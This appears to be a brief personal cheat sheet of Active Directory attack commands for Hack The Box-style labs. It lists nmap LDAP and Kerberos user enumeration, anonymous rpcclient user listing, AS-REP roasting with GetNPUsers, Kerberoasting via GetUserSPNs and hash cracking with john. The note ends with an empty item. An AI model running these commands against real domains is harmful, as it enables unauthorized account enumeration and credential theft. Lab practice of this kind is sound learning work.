# Commands-Importants

- LDAP with nmap:
```bash
nmap --script ldap-search -p389 <target> -oN ldapScan
```
- Kerberos with nmap:
```bash
nmap -script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/Seclists/Usernames/Names/names.txt -p88 <target>
```
- Enumerate with `rpcclient`
```bash
rpcclient -U "" <target> -N -c 'enumdomusers' 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
```
- AS-REP Roasting attack -> I get a hash/ticket  of a user
```bash
GetNPUsers htb.local/ -no-pass -usersfile users
```
- KERBEROS -> I need credentials -> `GetUserSPNs`

- Crack the hash/ticket with `john`

- 
